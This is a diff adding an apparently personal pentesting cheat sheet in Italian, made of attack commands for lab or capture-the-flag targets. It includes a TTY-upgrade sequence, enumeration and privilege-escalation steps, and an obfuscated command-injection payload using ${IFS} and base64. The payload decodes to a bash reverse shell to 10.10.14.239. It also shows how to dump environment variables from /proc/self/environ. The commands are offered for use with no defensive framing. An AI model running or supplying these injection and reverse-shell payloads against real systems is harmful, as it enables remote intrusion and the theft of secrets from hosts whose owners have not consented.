@@ -1,0 +1,60 @@
+
+
+python3 -c 'import pty;pty.spawn("/bin/bash");'
+export TERM=xterm
+control Z (stoppare mandare in background)
+
+ritorno su shell locale
+
+stty raw -echo;fg;
+
+
+
+
+
+
+
+
+- whoami
+- pwd
+- etc/passwd per vedere se ci sono altre persone, se non c'è nessuno vai su root
+
+se non trovo niente allora
+linPEAS 
+winPEAS
+
+
+poi se non va ancora
+PSPI
+
+
+
+
+
+fare un wget prima per capire se non è blind
+
+
+echo {BASE64 da burp}|base64 -d|bash
+${IFS}
+
+;echo${IFS%25%3f%3f}YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yMzkvMTIzNDUgMD4mMQ%3d%3d|base64${IFS%25%3f%3f}-d|bash;
+
+
+
+
+
+
+
+
+
+per controllare variabili ambiente
+env
+cat /proc/self/environ
+
+
+
+
+
+
+
+└─$ 
